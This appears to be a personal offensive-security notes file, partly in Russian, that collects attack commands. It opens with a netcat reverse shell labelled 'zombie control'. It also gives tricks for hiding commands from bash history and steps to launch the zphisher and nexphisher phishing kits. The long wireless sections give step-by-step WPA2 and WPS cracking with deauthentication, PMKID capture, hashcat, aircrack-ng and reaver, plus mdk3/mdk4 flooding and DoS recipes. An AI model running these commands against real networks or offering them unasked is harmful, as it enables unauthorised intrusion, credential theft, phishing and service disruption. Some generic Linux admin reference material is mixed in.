+# zombie control <a id="org964fc2a"></a>
+
+-   /usr/bin/mkfifo /tmp/f
+-   /bin/nc 192.168.1.xx 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &
+
+
+<a id="org7110c10"></a>
+
+# TODO
+
+SQLi, XSS, Local file inclusion(LFI), and other payloads
+
+reconnaissance -?
+
+enumeration/scanning.
+sudo nmap -sV -A -oN optimium.txt <TARGET<sub>IP</sub>>
+
+-   -sV Probe open ports to determine service/version info.
+-   -A Enable OS detection, version detection, script scanning, and traceroute.
+-   -oN Output scan in normal.
+
+
+<a id="orga8a8f3b"></a>
+
+# Linux investigate
+
+1.  version
+    -   uname -a
+    -   ls /etc/\*release ; cat ???
+    -   hostnamectl
+
+1.  disks, memory
+2.  vmstat
+
+
+<a id="org66f89f0"></a>
+
+## all
+
+-   **pwd:** Print working directory, i.e., display the name of my current directory on the screen.
+-   **hostname:** Print the name of the local host (the machine on which I am working). Use netconf (as
+    root) to change the name of the machine.
+-   **whoami:** Print my login name.
+-   **id:** Print user id (uid) and his/her group id (gid), effective id (if different than the real id) and the supplementary groups.
+-   **date:** Print the operating system current date, time and timezone. For an ISO standard format, I have to use date -Iseconds. I can change the date and time to 2000-12-31 23:57 using the command date 123123572000 or using these two commands (easier to remember):
+    -   date -set 2000-12-31 To set the hardware (BIOS) clock from the system (Linux) clock, I can use the command (as root) setclock. The international (ISO 8601) standard format for all-numeric date/time has the form: 2001-01-31 (as in Linux default "C" localization). You can be more precise if you wish using, for example: 2001-01-31 23:59:59.999-05:00 (representing I millisecond before February 2001, in a timezone which is 5 hours behind the Universal Coordinated Time (UTC)) . The most "kosher" representation of the same point in time could be: 20010131T235959,999-0500. See the standard at <ftp://ftp.qsl.net/pub/g1smd/8601v03.pdf>.
+    -   date -set 23:57:00
+-   **time:** Determine the amount of time that it takes for a process to complete + other process accounting. Don't confuse it with the date command (see previous entry). E.g. I can find out how long it takes to display a directory content using: time ls. Or I can test the time function with time sleep 10 (time the commands the does nothing for 10 seconds).
+-   **clock and hwclock:** (two commands, use either). Obtain date/time from the computer hardware (real time, battery-powered) clock. You can also use one of this commands to set the hardware clock, but setclock may be simplier (see command above). Example: hwclock -systohc -utc sets the hardware clock (in UTC) from the system clock.
+-   **who:** Determine the users logged on the machine.
+-   **w:** Determine who is logged on the system, find out what they are doing, their processor ussage,
+    etc. Handy security command.
+    -   rwho -a (=remote who) Determine users logged on other computers on your network. The rwho service must be enabled for this command to run. If it isn't, run setup (RedHat specific) as root to enable "rwho".
+-   **last:** Show listing of users last logged-in on your system. Really good idea to check it from time to time as a security measure on your system.
+-   **lastb:** ("=last bad") Show the last bad (unsuccessful) login attempts on my system. It did not work on my system, so got it started with: touch /var/log/btmp
+    -   "There's a good reason why /var/log/btmp isn't available on any sane set-up - it's a world-readable file containing login mistakes. Since one of the most common login mistakes is to type the password instead of the username, /var/log/btmp is a gift to crackers." (Thanks to Bruce Richardson). It appears the problem can be solved by changing the file permissions so only root can use "lastb":
+    -   chmod o-r /var/log/btmp
+-   **history | more:** Show the last (1000 or so) commands executed from the command line on the current account. The "| more" causes the display to stop after each screen-full. To see what another user was doing on your system, login as "root" and inspect his/her "history". The history is kept in the file .bash<sub>history</sub> in the user home directory (so yes, it can be modified or erased).
+-   **uptime:** Show the amount of time since the last reboot.
+-   **ps:** (="print status" or "process status") List the processes currently run by the current user.
+-   **ps axu | more:** List all the processes currently running, even those without the controlling
+    terminal, together with the name of the user that owns each process.
+-   **top:** Keep listing the currently running processes on my computer, sorted by cpu usage (top processes first). Press <Ctrl>c when done.
+
+    PID = process identification.
+    USER = name of the user who owns (started?) the process.
+    PRI = priority of the process (the higher the number, the lower the priority, normal 0, highest priority is -20, lowest 20.
+    NI = niceness level (i.e., if the process tries to be nice by adjusting the priority by the number given). The higher the number, the higher the niceness of the process (i.e., its priority is lower).
+    SIZE = kilobytes of code+data+stack taken by the process in memory.
+    RSS = kilobytes of physical (silicon) memory taken.
+    SHARE = kilobytes of memory shared with other processes.
+    STAT = state of the process: S-sleeping, R-running, T-stopped or traced, D-uniterruptable sleep, Z=zombie.
+    %CPU = share of the CPU usage (since last screen update).
+    %MEM = share of physical memory.
+    TIME = total CPU time used by the process (since it was started).
+    COMMAND = command line used to start the task (careful with passwords, etc., on command line, all permitted to run "top" may see them!
+
+    -   **gtop, ktop and htop:** (in X terminal) Three GUI choices for top. My favourite is gtop (comes with gnome). In KDE, ktop is also available from the "K"menu under "System"-"Task Manager".
+
+-   **uname -a:** (= "Unix name" with option "all") Info on your (local) server. I can also use guname (in X-window terminal) to display the info more nicely.
+-   **Xorg -version:** Show me the version of X windows I have on my system.
+-   **cat /etc/issue:** Check what distribution you are using. You can put your own message in this text file - it's displayed on login. It is more common to put your site-specific login message to the file /etc/motd ("motd"="message of the day").
+-   **free:** Memory info (in kilobytes). "Shared" memory is the memory that can be shared between
+    processes (e.g., executable code is "shared"). "Buffered" and "cashed" memory is the part that
+    keeps parts of recently accessed files - it can be shrunk if more memory is needed by processes.
+-   **df -h:** (=disk free) Print disk info about all the filesystems (in human-readable form).
+-   **du / -bh | more:** (=disk usage) Print detailed disk usage for each subdirectory starting at the
+    "/" (root) directory (in human legible form).
+-   **cat /proc/cpuinfo:** Cpu info - shows the content of the file cpuinfo. Note that the files in the /proc directory are not real files - they are hooks to look at information available to the kernel.
+-   **cat /proc/interrupts:** List the interrupts in use. May need to find out before setting up new hardware.
+-   **cat /proc/version:** Linux version and other info.
+-   **cat /proc/filesystems:** Show the types of filesystems currently in use.
+-   **cat /etc/printcap |more:** Show the setup of printers.
+-   **lsmod:** (= "list modules". As root. Use /sbin/lsmod to execute this command when you are a non-root user.) Show the kernel modules currently loaded.
+-   **set|more:** Show the current user environment (in full). Normally too much to bother.
+-   **echo $PATH:** Show the content of the environment variable PATH. This command can be used to show other environment variables as well. Use set to see the full environment (see the previous command).
+-   **dmesg | less:** Print kernel messages (the content of the so-called kernel ring buffer). Press "q" to quit "less". Use less /var/log/dmesg to see what "dmesg" dumped into this file right after the last system bootup.
+-   **chage -l my<sub>login</sub><sub>name</sub>:** See my password expiry information.
+-   **quota:** See my disk quota (the limits of disk usage).
+-   **sysctl -a |more:** Display all the configurable Linux kernel parameters.
+-   **runlevel:** Print the previous and current runlevel. The output "N5" means: "no previous runlevel" and "5 is the current runlevel". To change the runlevel, use "init", e.g., init 1 switches the system to a single user mode.
+    -   Runlevel is the mode of operation of Linux. Runlevel can be switched "on the fly" using the command init. For example, init 3 (as root) will switch me to runlevel 3. The following runlevels are standard:
+        0 - halt (Do NOT set initdefault to this)
+        1 - Single user mode
+        2 - Multiuser, without NFS (The same as 3, if you do not have networking)
+        3 - Full multiuser mode
+        4 - unused
+        5 - X11
+        6 - reboot (Do NOT set initdefault to this)
+
+The system default runlevel is set in the file: /etc/inittab.
+
+
+<a id="orgf23a82d"></a>
+
+# Linux hide
+
+
+<a id="org20019c6"></a>
+
+## bash history
+
+-   history -r clear the Bash history of the current session only
+-   $ unset HISTFILE Don’t save commands in Bash history for current session
+-   history -dw 352 Remove a certain line from Bash history
+-   echo "discreet";history -d $(history 1) - execute command without saving to history
+
+
+<a id="org2eae2e1"></a>
+
+# scanning network
+
+-   **Banner grabbing:** nc www.targethost.com 80
+-   **Web crawler:** spider or spider bot - idexing
+
+tools:
+
+-   netcat - send ASCII over TCP/IP (net-analyzer/netcat)
+
+
+<a id="org916e3bc"></a>
+
+# Phishing
+
+-   <https://github.com/htr-tech/zphisher>
+    -   cd zphisher
+    -   bash zphisher.sh
+-   <https://github.com/htr-tech/nexphisher>
+    -   git clone
+    -   cd nexphisher
+    -   bash setup
+    -   bash tmux<sub>setup</sub>
+    -   bash nexphisher
+
+
+<a id="org963a15b"></a>
+
+# Exploit
+
+exploit development framework <https://github.com/rapid7/metasploit-framework>
+
+
+<a id="org398f4e2"></a>
+
+# nmap
+
+<https://nmap.org/book/host-discovery-specify-targets.html>
+
+
+<a id="orgf0f068a"></a>
+
+## theory
+
+
+<a id="org1cc83bc"></a>
+
+### ports
+
+-   0 through 1023: Well Known Ports
+-   1024 through 49151: Registered Ports
+-   49152 through 65535: Dynamic or Private Ports
+
+
+<a id="org0f8895e"></a>
+
+### addressing
+
+-   CIDR-style addressing (notation):
+    -   192.168.10.0/24 - 256 hosts
+-   CIDR and octet ranges aren't supported for IPv6 because they are rarely useful
+-   IPv6 addresses can only be specified by their fully qualified IPv6 address or hostname
+
+-   -iL filename, or -il - is a standart input
+-   -iR numtries - get random IPs from global Internet (0 infinity)
+-   &#x2013;exclude t1,t2,t3  &#x2013;excludefile filename
+
+Ex. nmap scanme.nmap.org 192.168.0.0/8 10.0.0,1,3-7
+
+Dry run:
+
+-   -sL - list traget to scan
+-   -n - don't do DNS resolution
+
+
+<a id="org4f437a2"></a>
+
+### port states
+
+The six port states recognized by Nmap
+
+-   **open:** An application is actively accepting TCP connections, UDP datagrams or SCTP
+    associations on this port. Finding these is often the primary goal of port
+    scanning. Security-minded people know that each open port is an avenue for attack. Attackers and
+    pen-testers want to exploit the open ports, while administrators try to close or protect them with
+    firewalls without thwarting legitimate users. Open ports are also interesting for non-security
+    scans because they show services available for use on the network.
+-   **closed:** A closed port is accessible (it receives and responds to Nmap probe packets), but there
+    is no application listening on it. They can be helpful in showing that a host is up on an IP
+    address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are
+    reachable, it may be worth scanning later in case some open up. Administrators may want to
+    consider blocking such ports with a firewall. Then they would appear in the filtered state,
+    discussed next.
+-   **filtered:** Nmap cannot determine whether the port is open because packet filtering prevents its
+    probes from reaching the port. The filtering could be from a dedicated firewall device, router
+    rules, or host-based firewall software. These ports frustrate attackers because they provide so
+    little information. Sometimes they respond with ICMP error messages such as type 3 code 13
+    (destination unreachable: communication administratively prohibited), but filters that simply drop
+    probes without responding are far more common. This forces Nmap to retry several times just in
+    case the probe was dropped due to network congestion rather than filtering. This slows down the
+    scan dramatically.
+-   **unfiltered:** The unfiltered state means that a port is accessible, but Nmap is unable to
+    determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets,
+    classifies ports into this state. Scanning unfiltered ports with other scan types such as Window
+    scan, SYN scan, or FIN scan, may help resolve whether the port is open.
+-   **open|filtered:** Nmap places ports in this state when it is unable to determine whether a port is
+    open or filtered. This occurs for scan types in which open ports give no response. The lack of
+    response could also mean that a packet filter dropped the probe or any response it elicited. So
+    Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN,
+    NULL, and Xmas scans classify ports this way.
+-   **closed|filtered:** This state is used when Nmap is unable to determine whether a port is closed or
+    filtered. It is only used for the IP ID idle scan.
+
+
+<a id="orgb6b46d3"></a>
+
+## default scan
+
+Nmap performs a TCP SYN scan against the top 1,000 ports, as specified in the nmap-services file.
+
+
+<a id="org231a847"></a>
+
+## SCAN TECHNIQUES
+
+-   -sn - ICMP echo (not broadcast), TCP SYNC 443, PCP ACK to port 80
+    -   nmap -sn 192.168.0.1/24
+
+
+<a id="orgca8d838"></a>
+
+## nping  Network packet generation tool
+
+nping -c 1 &#x2013;tcp -p 80,433 scanme.nmap.org google.com
+
+
+<a id="org68cb035"></a>
+
+## TODO ncat - reading, writing, redirecting, and encrypting data across a network
+
+
+<a id="orga17c85b"></a>
+
+## USECASES
+
+
+<a id="org6b91839"></a>
+
+### system and version scan
+
+-   nmap -O - OS detection
+-   nmap -sV - open ports service/version
+
+
+<a id="org1d0e1c6"></a>
+
+### port scan:
+
+-   nmap -p 80 192.168.20.128
+-   nmap –top-ports 15 196.134.5.67
+-   nmap -open 198.152.45.33
+
+
+<a id="org9dedaea"></a>
+
+### scan subnet
+
+
+<a id="org48afb0b"></a>
+
+# wifi
+
+
+<a id="org6194046"></a>
+
+## net-wireless/kismet
+
+Channel Hopping - capture while hopping through multiple channels
+
+
+<a id="org5445acc"></a>
+
+### links
+
+-   doc <https://www.kismetwireless.net/docs/>
+
+
+<a id="orgb03f8fe"></a>
+
+## to watch communication
+
+-   need handshake packages captured
+-   You can force a client to re-authenticate again with a lot of tools so you will instantly get
+    this.
+
+
+<a id="orgd4c253c"></a>
+
+## attacks
+
+-   <https://wiki.installgentoo.com/wiki/Breaking_WPA2>
+
+
+<a id="orge27e9cc"></a>
+
+### attacks
+
+-   IV attack - initialization vector (IV) or starting variable (SV)
+-   KRACK ("Key Reinstallation Attack")
+-   Packet sniffing
+-   Near field communication
+-   Replay attacks
+-   Rogue access points
+-   Jamming/Interference
+-   Evil twin - WPA2 - create an access point using the same ESSID  more powerful signal strength
+    -   s0lst1c3/eaphammer.git
+    -   <https://github.com/FluxionNetwork/fluxion>
+-   key reinstallation attacks (KRACK) - WPA2
+-   War driving
+-   Bluejacking
+-   Bluesnarfing
+-   War chalking
+-   snooping
+
+
+<a id="orgd3cf15a"></a>
+
+### KRACK (Key Reinstallation Attack)
+
+-   repeatedly resetting the nonce transmitted in the third step of the WPA2 handshake.
+-   obtain the TCP sequence numbers of a connection, and hijack TCP connections.
+-   Adversary can force the client into using a predictable all-zero encryption key.
+-   can be patched
+-   The attack works for both clients and access points
+-   Adversary can not recover WPA password
+-   Adversary can not inject packets. (AES-CCMP ONLY)
+-   Physical Proximity: An attack can only happen when adversary is in physical proximity to and within wireless range of your network
+-   Time Window: An attack can only happen when a client device is connecting or reconnecting to a Wi-Fi network
+-   decrypt TCP SYN packets ->  hijack TCP connections
+-   <https://github.com/vanhoefm/krackattacks-scripts>
+-   <https://github.com/kristate/krackinfo>
+
+
+<a id="org3948c8c"></a>
+
+### WPA2 brute force
+
+computer can only test 50 to 300 possible keys per second
+
+
+<a id="orgaa1f955"></a>
+
+### WPS online brute force
+
+-   reaver
+-   bully
+
+links
+
+-   reaver net-wireless/reaver <https://github.com/t6x/reaver-wps-fork-t6x>
+    -   <https://www.cyberpunk.rs/brute-force-attack-against-wps-reaver>
+    -   <https://code.google.com/p/reaver-wps/>
+    -   <https://github.com/t6x/reaver-wps-fork-t6x>
+    -   <https://packages.gentoo.org/packages/net-wireless/reaver>
+    -   <https://www.hackers-arise.com/post/2018/02/07/wireless-hacking-how-to-hack-the-wps-pin-with-reaver>
+    -   <https://outpost24.com/blog/wps-cracking-with-reaver>
+-   wpscrack (faster, but only support for major router brands)
+-   bully <https://www.cyberpunk.rs/bully-wps-brute-force-attack>
+    -   <https://github.com/aanarchyy/bully>
+
+
+<a id="org628d0a3"></a>
+
+## tcpdump
+
+-   tcpdump -D - devices list
+-   tcpdump -w tcpdump icmp -i 1 - dump device 1
+
+
+<a id="org36d040d"></a>
+
+## hashcat
+
+-   <https://hashcat.net/forum/thread-10253.html>
+-   all 802.11i/p/q/r networks with roaming functions enabled (most modern routers)
+-   Pairwise Master Key Identifier (PMKID)-based roaming features enabled
+-   on the RSN IE (Robust Security Network Information Element) using a single EAPOL (Extensible Authentication
+    Protocol over LAN) frame after requesting it from the access point.
+-   Robust Security Network is a protocol for establishing secure communications over an 802.11 wireless
+    network and has PMKID, the key needed to establish a connection between a client and an access point, as one
+    of its capabilities.
+-   hcxdumptool (v4.2.0 or higher), to request the PMKID from the targeted access point and dump the received frame to a file.
+    -   $ ./hcxdumptool -o test.pcapng -i wlp39s0f3u4u5 &#x2013;enable<sub>status</sub>
+    -   <https://github.com/ZerBea/hcxdumptool>
+-   converted into a hash format accepted by Hashcat.
+    -   $ ./hcxpcaptool -z test.16800 test.pcapng
+    -   <https://github.com/ZerBea/hcxtools>
+        -   require libssl-dev
+-   e Hashcat (v4.2.0 or higher
+    -   ./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
+    -   <https://github.com/hashcat/hashcat>
+-   PMKID-based roaming features enabled … using IEEE 802.11i/p/r protocols.
+-   WLAN vendors which send the PMKID in the first message of the 4-way handhake should consider to remove the
+    PMKID in WPA2 PSK configured WLANs (non-802.11r). This way the exploit is fully mitigated.
+-   If you are an 802.11r user in combination with PSK, reflect453 if this is really necessary. [Or] disable WPA2
+    Personal in your network completely and rely on WPA2 Enterprise using a secure EAP method (e.g. EAP-TLS,
+    PEAP, EAP-TTLS).
+-   <https://techbeacon.com/security/wpa2-hack-allows-wi-fi-password-crack-much-faster>
+
+steps
+
+1.  rc-service wpa<sub>supplicant</sub> down
+2.  Get PMKIDs and / or EAPOL message pairs
+    -   hcxdumptool -i interface -o dumpfile.pcapng &#x2013;active<sub>beacon</sub> &#x2013;enable<sub>status</sub>=15
+3.  Convert the traffic to hash format 22000:
+    -   hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
+4.  hashcat -m 22000 hash.hc22000 wordlist.txt # or cracked.txt.gz
+
+
+<a id="org494814c"></a>
+
+## hcxdumptool
+
+capture and detect weakness
+
+-   git clone &#x2013;depth=1 <https://github.com/ZerBea/hcxdumptool>
+-
+
+
+<a id="orgdfa899a"></a>
+
+## HashCat
+
+-   app-crypt/hashcat
+-   app-crypt/hashcat-utils
+
+
+<a id="org336682c"></a>
+
+## john the reaper
+
+-   <https://github.com/openwall/john>
+
+john -wordlist:wordlistmy.txt -rules &#x2013;stdout |less
+
+-   wordlistmy.txt -source rules
+-   used /etc/john/john.conf - [List.Rules:Wordlist]
+
+generate password rules
+
+-   Most people use easy to remember passwords, in this case it has to be 8 characters or over in length
+-   Append 0-9 to the word, i.e. (word)1, (word)2, (word)3, ..
+-   Sequence of numbers are often used, e.g. 123, 321, 999, ..
+-   First letter is often upper-case
+-   Short words (under 8 characters) are stringed in series of two, e.g. googlegoogle, hellohello, openopen, ..
+-   Forename and surname often used
+
+
+<a id="orge3a63ac"></a>
+
+### rules
+
+-   <https://contest-2010.korelogic.com/rules.html>
+
+-   <https://www.willhackforsushi.com/code/cowpatty/4.3/README>
+
+
+<a id="org91f5538"></a>
+
+## TODO JtR
+
+app-crypt/johntheripper-jumbo
+
+
+<a id="org8ff11e0"></a>
+
+## <https://beta.ivc.no/wiki/index.php/WPA_Attack>
+
+<https://www.renderlab.net/projects/WPA-tables/>
+
+
+<a id="orgd1462ef"></a>
+
+## <https://kalitut.com/hacking-wifi-using-pmkid-and-aircrack-ng/>
+
+Захват PMKID with handshake
+
+-   airodump-ng wlp0s20f0u1 &#x2013;channel 9 -w cap2
+
+
+<a id="orga61a98f"></a>
+
+## TODO android <https://github.com/VREMSoftwareDevelopment/WiFiAnalyzer>
+
+
+<a id="org7d235a1"></a>
+
+## my
+
+Взлом по словарю
+
+-   aircrack-ng -w test.dic test.pcap a-PMKID.pcap
+    -   test.dic - passwords list
+    -   test.pcap - full handshake
+    -   a-PMKID.pcap - PMKID not 00000000
+
+Unauth
+
+-   start kismet
+-   get BSSID and client MAC
+-   aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon
+    -   -a BSSID
+    -   -c client MAC
+-   save PKID and handshake pcap
+
+
+<a id="org52c26a1"></a>
+
+# pixiewps - WPS offline brute force
+
+The PIN can later be used to recover the WPA-PSK from the Access Point using a tool like Reaver, Bully or join directly
+the wireless network using wpa<sub>cli</sub> and other programs.
+
+<https://github.com/t6x/reaver-wps-fork-t6x>
+
+-   require: pixiewps, aircrack-ng
+
+usage
+
+-   wash -w wlan0 -s
+    -   -s - отправлять probe requests (зондирующие запросы) к каждой ТД, это позволит получить больше информации о ТД.
+    -   Для того, чтобы проводить поиск на 5GHz 802.11 каналах используется опция -5.
+
+-   reaver -i wlan0mon -c 13 -b AA:BB:CC:XX:YY:ZZ -vvv -K 1
+    -   reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15
+    -   reaver -i mon0 -d 30 -c 9 -b 00:23:69:48:33:95 -N -S -vv
+    -   -K 1 option performs the offline attack, Pixie Dust, by automatically passing the PKE, PKR, E-Hash1, E-Hash2, E-Nonce
+        and Authkey variables.
+    -   -c 13 - channel
+    -   -L Ignore locked WPS state.
+    -   -N Don’t send NACK packets when errors are detected.
+    -   -d 15 Delay 15 seconds between PIN attempts.
+    -   -T Set timeout period to half a second.
+    -   -r 3:15 After 3 attempts, sleep for 15 seconds
+    -   -S - ?
+-   wpa<sub>supplicant</sub> -D nl80211 -i <wireless<sub>interface</sub>> -c /etc/wpa<sub>supplicant.conf</sub> –B
+
+reaver good with:
+
+-   Keenetic-8955, 2.0, Vendor:RalinkTe
+
+2012 reaver - wps crack - 10hours
+<https://habr.com/ru/company/xakep/blog/143834/>
+
+wpscrack.py - reaver alternative:
+
+-   <https://github.com/kcdtv/wpscrack>
+
+
+<a id="org63121bc"></a>
+
+## reset router
+
+<https://en.kali.tools/?p=864>
+<https://en.kali.tools/?p=394>
+<https://github.com/DanMcInerney/wifijammer>
+<https://en.kali.tools/?p=90>
+<https://packages.gentoo.org/packages/net-wireless/mdk>
+<https://github.com/aircrack-ng/mdk4>
+mdk3 $interface$mon d -b $path -c $ch
+
+This floods the target AP with fake clients.
+
+-   mdk3 monX a -a xx:xx:xx:xx:xx:xx -m
+
+This causes Michael failure, stopping all wireless traffic. However, this only works if the target AP supports TKIP. (Can be AES+TKIP)
+
+-   mdk3 monX m -t xx:xx:xx:xx:xx:xx
+
+This keeps a continuous deauth on the network. If this attack does not start, make a blank text document in your root folder named blacklist. Leave it empty as MDK3 automatically populates the list.
+
+-   mdk3 monX d -b blacklist -c X
+
+This floods a bunch of fake APs to any clients in range (only effective to windows clients and maybe some other devices, Macs are protected against this).
+
+-   mdk3 monX b -t xx:xx:xx:xx:xx:xx -c X
+
+You will know when the AP has reset either by checking with
+
+-   wash -i monX -C
+
+ you should have a total of 5 windows open at the same time:
+ 1- airodump
+2- mdk3 a
+3- mdk3 b
+4- mdk3 d
+5- mdk3 m
+
+I generally like to use:
+mdk3 monX -a 00:11:22:33:44:55 -m
+mdk3 monX d -b blacklist -c X
+mdk3 monX b -t 00:11:22:33:44:55 -c X
+
+WPA-TKIP then also include:
+mdk3 monX m -t 00:11:22:33:44:55
+
+
+<a id="org23e0f9e"></a>
+
+## links
+
+-   pixiewps <https://github.com/wiire-a/pixiewps>
+    -   pixiewps - WPS PIN exploiting the low or non-existing entropy of some software implementations
+        -   seconds or minutes, depending on the target, if vulnerable.
+    -   pixie-dust attack
+    -   <https://github.com/wiire-a/pixiewps/wiki>
+    -   <https://forums.kali.org/showthread.php?25018-Pixiewps-wps-pixie-dust-attack-tool>
+    -   <https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack>-(Offline-WPS-Attack)
+    -   <https://opensourcelibs.com/lib/pixiewps>
+    -   <https://axcheron.github.io/hacking-wps-using-reaver-and-pixie-dust-attack/>
+-   WPS brute force <https://sviehb.wordpress.com/2011/12/27/wi-fi-protected-setup-pin-brute-force-vulnerability/>
+
+
+<a id="org5f33c50"></a>
+
+## bully online WPS
+
+Reaver was going in ascending order for generating the pins and Bully always got a random pin. gets early while guessing
+randomly
+
+bully -b 00:23:69:48:33:95
+
+
+<a id="org0c83920"></a>
+
+# net-wireless/aircrack-ng
+
+Kicking Off a Client - you must be close
+
+-   check devices <prefix>.kismet.netxml
+-   aireplay-ng -0 1 -a <mac of AP> -c <mac of client> wlan0mon # send DEAUTH packet
+-   They will probably try to automatically reconnect. This gives us the handshake we're after.
+-   aireplay-ng command will let you know how many ACKs (acknowledgements of your packets) were received
+-   If you get no acknowledgements, you're probably too far away from the network and need to get physically closer.
+
+WPA2:
+
+-   airomon-ng start wlan0
+-   airodump-ng -c 9 &#x2013;bssid 00:14:6C:7E:40:80 -w psk wlan0
+-   turn off hope in kissmet
+-   aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0
+-   aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk\*.cap
+
+    Experiment with using coWPAtty’s rainbow table attack,
+      genpmk -f <wordlist> -d <output filename> -s <ESSID>
+      cowpatty -r <capture> -d <hashes filename> -s <ESSID>
+
+
+<a id="org43f1899"></a>
+
+## suite components
+
+-   airbase-ng - WEP, WPA, AP mode, send/encrypt packages
+-   aircrack-ng -
+-   airdecap-ng - decrypt WEP/WPA/WPA2 capture files
+-   airdecloak-ng - WEP - remove clocking
+-   airdrop-ng - deauthentication of users
+-   aireplay-ng - WPA2  deauthentications attacks
+-   airgraph-ng - Client to AP Relationship, all probed SSID by clients
+-   airmon-ng - start monitor mode
+-   airodump-ng
+-   airolib-ng
+-   airserv-ng
+-   airtun-ng
+-   besside-ng
+-   dcrack
+-   easside-ng
+-   packetforge-ng
+-   tkiptun-ng
+-   wesside-ng
+
+
+<a id="org74d16be"></a>
+
+## airbase
+
+fake AP
+
+
+<a id="orge6e5542"></a>
+
+### features
+
+-   Implements the Caffe Latte WEP client attack
+-   Implements the Hirte WEP client attack
+-   Ability to cause the WPA/WPA2 handshake to be captured
+-   Ability to act as an ad-hoc Access Point
+-   Ability to act as a full Access Point
+-   Ability to filter by SSID or client MAC addresses
+-   Ability to manipulate and resend packets
+-   Ability to encrypt sent packets and decrypt received packets
+
+
+<a id="org2bf9bca"></a>
+
+## airmon
+
+monitor mode
+
+-   airmon-ng check
+-   airmon-ng check kill
+-   airmon-ng start wlan0 1
+
+
+<a id="orgd407255"></a>
+
+## airodump
+
+packet capture - raw 802.11 frames
+
+-   airodump-ng -c <channel> &#x2013;bssid <mac of AP> -w file<sub>prefix</sub> <interface>
+
+
+<a id="org5a3a66c"></a>
+
+### default:
+
+-   hops on all 2.4GHz channels
+-   record only 1 beacon for each network
+-   output in pcam, csv, kismet, kismet-newcore
+
+
+<a id="org49e13bd"></a>
+
+### output
+
+-   PWR - power
+-   RXQ Receive Quality as measured by the percentage of packets (management and data frames)
+    successfully received over the last 10 seconds
+-   Beacons - Number of announcements from AP
+-   \# Data	Number of captured data packets
+-   \#/s	Number of data packets per second measure over the last 10 seconds.
+-   CH	Channel number
+-   MB Maximum speed supported by the AP. If MB = 11, it's 802.11b, if MB = 22 it's 802.11b+ and up to
+    54 are 802.11g. Anything higher is 802.11n or 802.11ac.The dot (after 54 above) indicates short
+    preamble is supported. Displays “e” following the MB speed value if the network has QoS enabled.
+-   ENC - Encryption algorithm in use. OPN = no encryption
+-   AUTH
+    -   MGT (WPA/WPA2 using a separate authentication server)
+    -   SKA (shared key for WEP)
+    -   PSK (pre-shared key for WPA/WPA2)
+    -   OPN (open for WEP).
+-   STATION - MAC address of each associated station or stations searching for an AP to connect
+    with. Clients not currently associated with an AP have a BSSID of “(not associated)”.
+-   Rate	Station's receive rate, followed by transmit rate. Displays “e” following each rate if the network has QoS enabled.
+-   Lost - The number of data packets lost over the last 10 seconds based on the sequence number.
+-
+
+
+<a id="org7b5f6c9"></a>
+
+## aireplay-ng
+
+-   aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
+    -   -0 means deauthentication
+    -   1 is the number of deauths to send (you can send multiple if you wish)
+    -   -a 00:14:6C:7E:40:80 is the MAC address of the access point
+    -   -c 00:0F:B5:FD:FB:C2 is the MAC address of the client you are deauthing
+    -   ath0 is the interface name
+
+
+<a id="org0733572"></a>
+
+## airgraph-ng
+
+-   emerge media-gfx/graphviz
+
+usage
+
+1.  airodump-ng wlan0mon -w /root/Desktop/test
+2.  airmon-ng stop wlan0mon
+3.  airgraph-ng -i test-01.csv -o airgraph-test -g CARP
+
+
+<a id="orgabda8c8"></a>
+
+## links
+
+-   <https://wiki.installgentoo.com/wiki/Breaking_WPA2>
+-   <https://www.aircrack-ng.org/doku.php?id=tutorial>
+
+
+<a id="orgd58876b"></a>
+
+# mdk5
+
+sudo mdk4 wlo1 b -a -m -s 500
+
+-   b: Beacon Flooding
+
+-   -a Use also non-printable caracters in generated SSIDs  and create SSIDs that break the 32-byte limit
+-   -s <pps>  Set speed in packets per second (Default: 50)
+
+mdk4 wlan0 d -c 2
+
+-   d: Deauthentication and Disassociation
+
+ATTACK MODE d: Deauthentication and Disassociation - Sends deauthentication and disassociation packets to stations based
+  on data traffic to disconnect all clients from an AP.
+
+-   -w <filename>  Read file containing MACs not to care about (Whitelist mode)
+-   -b <filename> Read file containing MACs to run test on (Blacklist Mode)
+-   -s <pps> Set speed in packets per second (Default: unlimited)
+-   -x  Enable full IDS stealth by matching all Sequence Numbers  Packets will only be sent with clients' addresses
+-   -c [chan,chan,&#x2026;,chan[:speed]] Enable channel hopping. When -c h is given, mdk4 will hop an all 14 b/g
+    channels. Channel will be changed every 3 seconds, if speed is not specified. Speed value is in milliseconds!
+-   -E <AP ESSID> Specify an AP ESSID to attack.
+-   -B <AP BSSID> Specify an AP BSSID to attack.
+-   -S <Station MAC address> Specify a station MAC address to attack.
+
+ATTACK MODE m: Michael Countermeasures Exploitation
+  Sends random packets or re-injects duplicates on another QoS queue
+  to provoke Michael Countermeasures on TKIP APs.
+  AP will then shutdown for a whole minute, making this an effective DoS.
+      -t <bssid>
+         Set target AP, that runs TKIP encryption
+      -j
+         Use the new QoS exploit which only needs to reinject a few packets instead
+         of the random packet injection, which is unreliable but works without QoS.
+      -s <pps>
+         Set speed in packets per second (Default: 400)
+      -w <seconds>
+         Wait <seconds> between each random packet burst (Default: 10)
+      -n <count>
+         Send <count> random packets per burst (Default: 70)
+
+ATTACK MODE f: Packet Fuzzer
+  A simple packet fuzzer with multiple packet sources
+  and a nice set of modifiers. Be careful!
+  mdk4 randomly selects the given sources and one or multiple modifiers.
+      -s <sources>
+         Specify one or more of the following packet sources:
+         a - Sniff packets from the air
+         b - Create valid beacon frames with random SSIDs and properties
+         c - Create CTS frames to broadcast (you can also use this for a CTS DoS)
+         p - Create broadcast probe requests
+      -m <modifiers>
+         Select at least one of the modifiers here:
+         n - No modifier, do not modify packets
+         b - Set destination address to broadcast
+         m - Set source address to broadcast
